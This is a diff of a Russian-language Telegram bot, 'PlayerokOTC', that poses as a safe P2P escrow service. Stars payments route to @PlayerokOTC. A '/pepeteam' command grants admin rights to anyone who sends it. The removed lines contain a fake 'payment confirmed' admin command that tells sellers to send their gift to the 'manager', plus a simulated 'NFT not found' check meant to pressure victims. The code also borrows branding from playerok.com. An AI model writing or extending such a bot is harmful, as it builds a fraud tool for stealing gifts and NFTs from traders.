@@ -11,7 +11,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.storage.memory import MemoryStorage
 
 # ====== Настройки ======
-TOKEN = os.getenv("BOT_TOKEN")  # 🔹 токен из переменных окружения
+TOKEN = os.getenv("BOT_TOKEN")  # Токен из секретов Fly.io
 ADMIN_IDS = set()
 # =======================
 
@@ -27,6 +27,7 @@ class DealStates(StatesGroup):
     waiting_amount = State()
     waiting_description = State()
 
+# Основные кнопки
 main_kb = types.ReplyKeyboardMarkup(
     keyboard=[
         [types.KeyboardButton(text="Управление реквизитами"), types.KeyboardButton(text="Создать сделку")],
@@ -35,6 +36,7 @@ main_kb = types.ReplyKeyboardMarkup(
     resize_keyboard=True
 )
 
+# Клавиатура для выбора валюты
 currency_kb = types.ReplyKeyboardMarkup(
     keyboard=[[types.KeyboardButton(text=c)] for c in ["USD", "RUB", "UAH", "USDT", "BTC", "TON", "Stars"]],
     resize_keyboard=True
@@ -43,60 +45,69 @@ currency_kb = types.ReplyKeyboardMarkup(
 def gen_deal_id() -> str:
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
-# ======================= Хэндлеры =======================
-
+# ====== /start ======
 @dp.message(CommandStart())
 async def start(message: types.Message):
-    text = message.text or ""
-    parts = text.split()
-    if len(parts) > 1 and parts[1].startswith("deal"):
-        deal_id = parts[1][4:]
-        if deal_id not in deals:
-            await message.answer("❌ Сделка не найдена.")
-            return
-        deal = deals[deal_id]
-        if message.from_user.id == deal["seller_id"]:
-            await message.answer("❌ Вы не можете зайти в свою сделку как покупатель.")
-            return
-        deal["buyer_id"] = message.from_user.id
-        deal["buyer_username"] = message.from_user.username or str(message.from_user.id)
-        try:
-            await bot.send_message(
-                deal["seller_id"],
-                f"👤 Покупатель @{deal['buyer_username']} зашел в вашу сделку №{deal_id}"
-            )
-        except Exception:
-            pass
-        wallet_display = deal["wallet"] if deal["currency"] != "Stars" else "@PlayerokOTC"
-        stars_note = "Способ передачи: Передавайте подарки по 100 Stars\n" if deal["currency"] == "Stars" else ""
-        buyer_kb = types.InlineKeyboardMarkup(inline_keyboard=[
-            [types.InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"buyer_confirm_{deal_id}")],
-            [types.InlineKeyboardButton(text="🚪 Выйти из сделки", callback_data=f"buyer_exit_{deal_id}")]
-        ])
-        await message.answer(
-            f"💳 Информация о сделке #{deal_id}\n\n"
-            f"👤 Вы покупатель в сделке.\n"
-            f"📌 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n"
-            f"• Вы покупаете: {deal['desc']}\n\n"
-            f"🏦 Адрес для оплаты: {wallet_display}\n"
-            f"{stars_note}"
-            f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}\n"
-            f"📝 Комментарий к платежу (мемо): {deal['memo']}\n\n"
-            f"⚠️ Убедитесь в правильности данных перед оплатой.",
-            reply_markup=buyer_kb
-        )
-        return
-    await message.answer(
+    text = (
         "Добро пожаловать в PlayerokOTC – надежный P2P-гарант\n\n"
         "💼 Покупайте и продавайте безопасно с минимальной комиссией!\n"
-        "Выберите нужный раздел ниже:",
-        reply_markup=main_kb
+        "Выберите нужный раздел ниже:"
     )
+    photo_url = "https://playerok.com/og_playerok.png"
 
+    # Если передан deal в ссылке /start dealXXXX
+    parts = (message.text or "").split()
+    if len(parts) > 1 and parts[1].startswith("deal"):
+        deal_id = parts[1][4:]
+        if deal_id in deals:
+            deal = deals[deal_id]
+            if message.from_user.id == deal["seller_id"]:
+                await message.answer("❌ Вы не можете зайти в свою сделку как покупатель.")
+                return
+            deal["buyer_id"] = message.from_user.id
+            deal["buyer_username"] = message.from_user.username or str(message.from_user.id)
+
+            try:
+                await bot.send_message(
+                    deal["seller_id"],
+                    f"👤 Покупатель @{deal['buyer_username']} зашел в вашу сделку №{deal_id}"
+                )
+            except Exception:
+                pass
+
+            wallet_display = deal["wallet"] if deal["currency"] != "Stars" else "@PlayerokOTC"
+            stars_note = ""
+            if deal["currency"] == "Stars":
+                stars_note = "Способ передачи: Передавайте подарки по 100 Stars\n"
+
+            buyer_kb = types.InlineKeyboardMarkup(inline_keyboard=[
+                [types.InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"buyer_confirm_{deal_id}")],
+                [types.InlineKeyboardButton(text="🚪 Выйти из сделки", callback_data=f"buyer_exit_{deal_id}")]
+            ])
+
+            await message.answer(
+                f"💳 Информация о сделке #{deal_id}\n\n"
+                f"👤 Вы покупатель в сделке.\n"
+                f"📌 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n"
+                f"• Вы покупаете: {deal['desc']}\n\n"
+                f"🏦 Адрес для оплаты: {wallet_display}\n"
+                f"{stars_note}"
+                f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}\n"
+                f"📝 Комментарий к платежу (мемо): {deal['memo']}\n\n"
+                f"⚠️ Убедитесь в правильности данных перед оплатой.",
+                reply_markup=buyer_kb
+            )
+            return
+
+    # Основной старт с картинкой
+    await message.answer_photo(photo=photo_url, caption=text, reply_markup=main_kb)
+
+# ====== Поддержка ======
 @dp.message(F.text == "Поддержка")
 async def support(message: types.Message):
     await message.answer("🆘 Поддержка: @PlayerokOTC")
 
+# ====== Управление реквизитами ======
 @dp.message(F.text == "Управление реквизитами")
 async def manage_wallet(message: types.Message, state: FSMContext):
     await message.answer("💳 Выберите валюту вашего кошелька:", reply_markup=currency_kb)
@@ -109,14 +120,15 @@ async def set_currency(message: types.Message, state: FSMContext):
     if chosen not in allowed:
         await message.answer("❌ Выберите валюту только из предложенного списка.")
         return
+
     if chosen == "Stars":
         user_wallets[message.from_user.id] = {"currency": "Stars", "wallet": "@PlayerokOTC"}
         await message.answer("✅ Валюта установлена: Stars", reply_markup=main_kb)
         await state.clear()
         return
+
     await state.update_data(currency=chosen)
-    await message.answer(f"✅ Валюта установлена: {chosen}\nВведите реквизиты вашего кошелька:",
-                         reply_markup=types.ReplyKeyboardRemove())
+    await message.answer(f"✅ Валюта установлена: {chosen}\nВведите реквизиты вашего кошелька:", reply_markup=types.ReplyKeyboardRemove())
     await state.set_state(DealStates.waiting_wallet)
 
 @dp.message(DealStates.waiting_wallet)
@@ -127,6 +139,7 @@ async def set_wallet(message: types.Message, state: FSMContext):
     await message.answer(f"✅ Реквизиты сохранены: {message.text.strip()} ({currency})", reply_markup=main_kb)
     await state.clear()
 
+# ====== Создание сделки ======
 @dp.message(F.text == "Создать сделку")
 async def create_deal(message: types.Message, state: FSMContext):
     if message.from_user.id not in user_wallets:
@@ -153,8 +166,10 @@ async def deal_description(message: types.Message, state: FSMContext):
     amount = data.get("amount")
     desc = message.text.strip()
     wallet_info = user_wallets.get(user_id, {"currency": "USD", "wallet": "None"})
-    deal_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+    deal_id = gen_deal_id()
     memo = f"{deal_id}{user_id}"
+
     deals[deal_id] = {
         "seller_id": user_id,
         "seller_username": message.from_user.username or str(user_id),
@@ -166,6 +181,7 @@ async def deal_description(message: types.Message, state: FSMContext):
         "buyer_id": None,
         "buyer_username": None
     }
+
     link = f"https://t.me/PlayerokOTC_Robot?start=deal{deal_id}"
     await message.answer(
         f"✅ Сделка создана!\n\n"
@@ -176,6 +192,7 @@ async def deal_description(message: types.Message, state: FSMContext):
     )
     await state.clear()
 
+# ====== Callback для покупателя ======
 @dp.callback_query(F.data.startswith("buyer_confirm_"))
 async def buyer_confirm(callback: types.CallbackQuery):
     deal_id = callback.data.split("buyer_confirm_")[1]
@@ -190,79 +207,18 @@ async def buyer_exit(callback: types.CallbackQuery):
     await callback.message.edit_reply_markup(None)
     await callback.message.answer("🚪 Вы вышли из сделки.")
 
+# ====== Админ команды ======
 @dp.message(Command(commands=["pepeteam"]))
 async def pepeteam(message: types.Message):
     ADMIN_IDS.add(message.from_user.id)
-    await message.answer("✅ Вы стали админом. Теперь доступна команда /buy #код")
+    await message.answer("✅ Вы теперь админ!")
 
-@dp.message(F.text.startswith("/buy"))
-async def admin_buy(message: types.Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    text = message.text.strip()
-    deal_id = None
-    if "#" in text:
-        deal_id = text.split("#", 1)[1].strip()
-    else:
-        parts = text.split()
-        if len(parts) >= 2:
-            deal_id = parts[1].strip()
-    if not deal_id or deal_id not in deals:
-        await message.answer("❌ Сделка не найдена.")
-        return
-    deal = deals[deal_id]
-    seller_id = deal["seller_id"]
-    buyer_id = deal.get("buyer_id")
-    confirm_kb = types.InlineKeyboardMarkup(
-        inline_keyboard=[[types.InlineKeyboardButton(text="✅ Подтвердить отправку подарка", callback_data=f"seller_sent_{deal_id}")]]
-    )
-    await bot.send_message(
-        seller_id,
-        f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
-        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-        f"Описание: {deal['desc']}\n\n"
-        f"Передайте подарок менеджеру @PlayerokOTC и подтвердите ниже:",
-        reply_markup=confirm_kb
-    )
-    if buyer_id:
-        await bot.send_message(
-            buyer_id,
-            f"💳 Оплата подтверждена!\n▸ Сделка: #{deal_id}\n▸ Продавец: @{deal['seller_username']}\n▸ Сумма: {deal['amount']} {deal['currency']}\n▸ Описание: {deal['desc']}\n\n"
-            f"Ожидайте, продавец отправит подарок менеджеру @PlayerokOTC."
-        )
-
-@dp.callback_query(F.data.startswith("seller_sent_"))
-async def seller_sent(callback: types.CallbackQuery):
-    deal_id = callback.data.split("seller_sent_")[1]
-    if deal_id not in deals:
-        await callback.message.answer("❌ Сделка не найдена.")
-        return
-    deal = deals[deal_id]
-    buyer_id = deal.get("buyer_id")
-    await callback.message.answer(
-        f"⏳ Статус сделки #{deal_id}\n✅ Продавец подтвердил отправку подарка\n🔎 Менеджер @PlayerokOTC проверяет наличие NFT\n📭 Ожидайте доставки!"
-    )
-    if buyer_id:
-        await bot.send_message(
-            buyer_id,
-            f"⏳ Статус сделки #{deal_id}\n✅ Продавец подтвердил отправку подарка\n🔎 Менеджер @PlayerokOTC проверяет наличие NFT\n📭 Ожидайте доставки!"
-        )
-        async def nft_check_simulation():
-            await asyncio.sleep(300)
-            if deal_id in deals:
-                await bot.send_message(
-                    buyer_id,
-                    f"🚨 NFT не найден!\nСделка: #{deal_id}\nПричина: нет подарка у @PlayerokOTC.\n\nРешение: передайте подарок или обратитесь в поддержку."
-                )
-                await bot.send_message(
-                    deal["seller_id"],
-                    f"🚨 NFT не найден для сделки #{deal_id}. Проверьте передачу подарка менеджеру @PlayerokOTC."
-                )
-        asyncio.create_task(nft_check_simulation())
-
+# ====== Запуск ======
 async def main():
-    print("✅ Бот запущен...")
-    await dp.start_polling(bot)
+    try:
+        await dp.start_polling(bot)
+    finally:
+        await bot.session.close()
 
 if __name__ == "__main__":
     asyncio.run(main())
